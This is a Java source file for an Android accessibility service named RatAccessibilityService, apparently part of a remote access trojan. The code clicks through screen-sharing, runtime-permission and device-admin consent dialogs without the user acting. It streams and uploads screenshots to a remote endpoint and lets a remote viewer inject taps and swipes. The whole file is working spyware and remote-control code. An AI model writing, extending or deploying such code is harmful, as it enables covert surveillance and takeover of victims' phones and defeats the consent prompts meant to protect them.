package com.gls.sim1;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.view.Display;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.GestureDescription;

import java.util.Locale;

public class RatAccessibilityService extends AccessibilityService {
    public static volatile RatAccessibilityService INSTANCE;

    private static final String[] PROJECTION = {
            "entire screen", "share your screen", "share entire screen",
            "record or cast", "cast or record", "start recording or casting",
            "screen share", "screen cast", "screen recording", "cast your screen", "media projection"
    };

    private static final String[] ADMIN_MARKERS = {
            "device admin", "activate device admin", "activate this device admin app"
    };

    private static final String[] ADMIN_ACCEPT = {"activate"};

    private static final String[] ENTIRE = {
            "share entire screen", "entire screen", "share your screen",
            "full screen", "whole screen", "share entire",
            "entire device", "all of your screen"
    };

    private static final String[] ACCEPT = {
            "start now", "start recording", "start capture", "start casting",
            "allow", "start", "grant", "turn on", "activate", "continue"
    };

    @Override
    protected void onServiceConnected() {
        INSTANCE = this;
        AccessibilityServiceInfo info = getServiceInfo();
        if (info == null) info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags |= AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                | AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 60;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();
        boolean system = pkg.startsWith("com.android.systemui")
                || pkg.equals("android")
                || pkg.contains("permissioncontroller")
                || pkg.contains("com.android.settings")
                || pkg.contains("packageinstaller")
                || pkg.contains("com.google.android.permissioncontroller");
        if (!system) return;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) root = event.getSource();
        if (root == null) return;

        if (containsAny(root, PROJECTION)) {
            if (clickFirstMatch(root, ENTIRE)) return;
            clickFirstMatch(root, ACCEPT);
            return;
        }
        if (pkg.contains("permissioncontroller")) {
            if (clickFirstMatch(root, ACCEPT)) return;
            String[] permAccept = {
                    "while using the app", "only this time", "allow once", "allow",
                    "ok", "continue"
            };
            clickFirstMatch(root, permAccept);
            return;
        }
        if (pkg.contains("settings") && containsAny(root, ADMIN_MARKERS)) {
            clickFirstMatch(root, ADMIN_ACCEPT);
            return;
        }
        // prevent accidental global clicks: ignore others
    }

    public boolean containsAny(AccessibilityNodeInfo node, String[] needles) {
        if (node == null) return false;
        CharSequence t = node.getText();
        CharSequence cd = node.getContentDescription();
        String s = ((t != null ? t : "") + " " + (cd != null ? cd : ""))
                .toString().toLowerCase(Locale.ROOT);
        if (!s.isEmpty()) {
            for (String n : needles) {
                if (s.contains(n)) return true;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo c = node.getChild(i);
            if (c != null) {
                try {
                    if (containsAny(c, needles)) return true;
                } catch (Exception ignored) {
                }
            }
        }
        return false;
    }

    @Override
    public void onInterrupt() {}

    public boolean clickFirstMatch(AccessibilityNodeInfo node, String[] needles) {
        if (node == null) return false;
        if (node.isClickable()) {
            CharSequence t = node.getText();
            CharSequence cd = node.getContentDescription();
            String s = ((t != null ? t : "") + " " + (cd != null ? cd : ""))
                    .toString().toLowerCase(Locale.ROOT).trim();
        for (String n : needles) {
            if (s.contains(n)) {
                boolean ok = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                if (ok) {
                    android.util.Log.i("SIM1", "a11y click match='" + n + "'");
                    return true;
                }
            }
        }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo c = node.getChild(i);
            if (c != null) {
                try {
                    if (clickFirstMatch(c, needles)) return true;
                } catch (Exception ignored) {
                }
            }
        }
        return false;
    }

    public boolean takeShot() {
        if (Build.VERSION.SDK_INT >= 30) {
            try {
                takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new ScreenshotCallbackImpl());
                return true;
            } catch (Exception e) {
                return false;
            }
        }
        return false;
    }

    private final java.util.concurrent.atomic.AtomicBoolean shotStream =
            new java.util.concurrent.atomic.AtomicBoolean(false);
    private android.os.Handler shotHandler;
    private java.util.concurrent.ExecutorService shotExec;
    private volatile int shotInterval = 150;
    private final int shotIntervalMax = 300;
    private final int shotIntervalMin = 120;

    public void startShotStream() {
        if (!shotStream.compareAndSet(false, true)) return;
        if (shotHandler == null) {
            android.os.HandlerThread t = new android.os.HandlerThread("s1-shot");
            t.start();
            shotHandler = new android.os.Handler(t.getLooper());
        }
        if (shotExec == null) {
            shotExec = java.util.concurrent.Executors.newSingleThreadExecutor();
        }
        android.util.Log.i("SIM1", "shot stream start");
        scheduleShot();
    }

    public void stopShotStream() {
        shotStream.set(false);
        android.util.Log.i("SIM1", "shot stream stop");
    }

    private void scheduleShot() {
        if (!shotStream.get() || shotHandler == null) return;
        try {
            takeScreenshot(Display.DEFAULT_DISPLAY, shotExec, new StreamShotCallback());
        } catch (Exception e) {
            shotHandler.postDelayed(this::scheduleShot, 400);
        }
    }

    private final class StreamShotCallback implements AccessibilityService.TakeScreenshotCallback {
        @Override public void onSuccess(AccessibilityService.ScreenshotResult result) {
            HardwareBuffer hb = null;
            try {
                hb = result.getHardwareBuffer();
                Bitmap bmp = Bitmap.wrapHardwareBuffer(hb, result.getColorSpace());
                if (bmp != null) {
                    Bitmap soft = bmp.copy(Bitmap.Config.ARGB_8888, false);
                    bmp.recycle();
                    if (soft != null) {
                        byte[] jpg = StreamEncoder.toJpeg(soft, 50);
                        soft.recycle();
                        ScreenStreamer.getInstance().sendScreenFrame(jpg);
                    }
                }
            } catch (Exception ignored) {
            } finally {
                if (hb != null) { try { hb.close(); } catch (Exception ignored) {} }
                if (shotStream.get() && shotHandler != null) {
                    shotHandler.postDelayed(RatAccessibilityService.this::scheduleShot, shotInterval);
                }
            }
        }
        @Override public void onFailure(int errorCode) {
            if (shotInterval < shotIntervalMax) shotInterval += 30;
            if (shotInterval > shotIntervalMax) shotInterval = shotIntervalMax;
            android.util.Log.w("SIM1", "shot fail code=" + errorCode + " next=" + shotInterval);
            if (shotStream.get() && shotHandler != null) {
                shotHandler.postDelayed(RatAccessibilityService.this::scheduleShot, shotInterval);
            }
        }
    }

    private final class ScreenshotCallbackImpl implements AccessibilityService.TakeScreenshotCallback {
        @Override public void onSuccess(AccessibilityService.ScreenshotResult result) {
            HardwareBuffer hb = null;
            try {
                hb = result.getHardwareBuffer();
                ColorSpace cs = result.getColorSpace();
                Bitmap bmp = Bitmap.wrapHardwareBuffer(hb, cs);
                if (bmp == null) return;
                Bitmap soft = bmp.copy(Bitmap.Config.ARGB_8888, false);
                bmp.recycle();
                if (soft == null) return;
                byte[] jpg = StreamEncoder.toJpeg(soft, 90);
                soft.recycle();
                Context c = Foreground.ctx();
                if (c != null) {
                    Net.uploadFile(Net.deviceId(c), "shot-" + System.currentTimeMillis() + ".jpg", jpg, "image/jpeg");
                }
            } catch (Exception ignored) {
            } finally {
                if (hb != null) {
                    try { hb.close(); } catch (Exception ignored) {}
                }
            }
        }

        @Override public void onFailure(int errorCode) {}
    }

    public static boolean isUp() {
        return INSTANCE != null;
    }

    // ---------- remote touch control (normalized 0..1 coords from viewer) ----------

    public float[] realSize() {
        try {
            Display d = null;
            if (Build.VERSION.SDK_INT >= 30) d = getDisplay();
            if (d == null) {
                android.view.WindowManager wm = (android.view.WindowManager)
                        getSystemService(Context.WINDOW_SERVICE);
                if (wm != null) d = wm.getDefaultDisplay();
            }
            android.graphics.Point p = new android.graphics.Point();
            d.getRealSize(p);
            if (p.x > 0 && p.y > 0) return new float[]{p.x, p.y};
        } catch (Throwable ignored) {
        }
        android.util.DisplayMetrics dm = getResources().getDisplayMetrics();
        return new float[]{Math.max(dm.widthPixels, 1), Math.max(dm.heightPixels, 1)};
    }

    private boolean stroke(float[][] pts, int durMs) {
        final RatAccessibilityService self = this;
        android.graphics.Path path = new android.graphics.Path();
        float[] sz = realSize();
        path.moveTo(pts[0][0] * sz[0], pts[0][1] * sz[1]);
        for (int i = 1; i < pts.length; i++) path.lineTo(pts[i][0] * sz[0], pts[i][1] * sz[1]);
        long dur = Math.max(durMs, 50);
        GestureDescription g = new GestureDescription.Builder()
                .addStroke(new GestureDescription.StrokeDescription(path, 0, dur))
                .build();
        final java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
        final boolean[] ok = {false};
        try {
            new android.os.Handler(getMainLooper()).post(() -> {
                try {
                    ok[0] = self.dispatchGesture(g, new GestureResultCallback() {
                        @Override public void onCompleted(GestureDescription gd) { ok[0] = true; latch.countDown(); }
                        @Override public void onCancelled(GestureDescription gd) { latch.countDown(); }
                    }, new android.os.Handler(getMainLooper()));
                } catch (Throwable t) {
                    latch.countDown();
                }
                if (!ok[0]) latch.countDown();
            });
        } catch (Throwable t) {
            return false;
        }
        try {
            latch.await(2500, java.util.concurrent.TimeUnit.MILLISECONDS);
        } catch (InterruptedException ignored) {
        }
        android.util.Log.i("SIM1", "gesture pts=" + pts.length + " ok=" + ok[0]);
        return ok[0];
    }

    public boolean tapNorm(float nx, float ny) {
        if (INSTANCE == null) return false;
        return stroke(new float[][]{{clamp(nx), clamp(ny)}}, 80);
    }

    public boolean pressNorm(float nx, float ny, int durMs) {
        if (INSTANCE == null) return false;
        return stroke(new float[][]{{clamp(nx), clamp(ny)}}, durMs);
    }

    public boolean swipeNorm(float x1, float y1, float x2, float y2, int durMs) {
        if (INSTANCE == null) return false;
        return stroke(new float[][]{{clamp(x1), clamp(y1)}, {clamp(x2), clamp(y2)}}, durMs);
    }

    private static float clamp(float v) {
        if (v < 0f) return 0f;
        if (v > 1f) return 1f;
        return v;
    }

    public static void kick(Context ctx, String type, String facing) {
        Intent i = new Intent(ctx, ConsentActivity.class);
        i.putExtra("type", type);
        if (facing != null) i.putExtra("facing", facing);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
        try {
            ctx.startActivity(i);
            android.util.Log.i("SIM1", "ConsentActivity kicked type=" + type);
        } catch (Exception e) {
            android.util.Log.e("SIM1", "kick failed: " + e);
        }
    }
}
